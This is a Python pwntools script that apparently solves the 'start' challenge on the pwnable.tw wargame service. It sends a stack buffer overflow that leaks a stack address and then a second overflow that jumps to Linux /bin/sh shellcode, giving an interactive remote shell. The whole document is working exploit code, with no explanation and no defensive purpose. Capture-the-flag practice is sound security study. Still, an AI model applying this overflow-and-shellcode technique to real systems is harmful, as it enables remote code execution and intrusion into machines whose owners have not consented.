from pwn import *

context.arch = 'i386'

host = 'chall.pwnable.tw'
port = 10000

r = remote(host, port)

write_1_esp = 0x08048087

payload = b'a'*20 + p32(write_1_esp)
r.recvuntil(':')
r.send(payload)

stack = u32(r.recvn(4)) + 20
print('stack =', hex(stack))
payload = b'a'*20 + p32(stack) + asm(shellcraft.linux.sh())
sleep(0.1)
r.send(payload)

r.interactive()
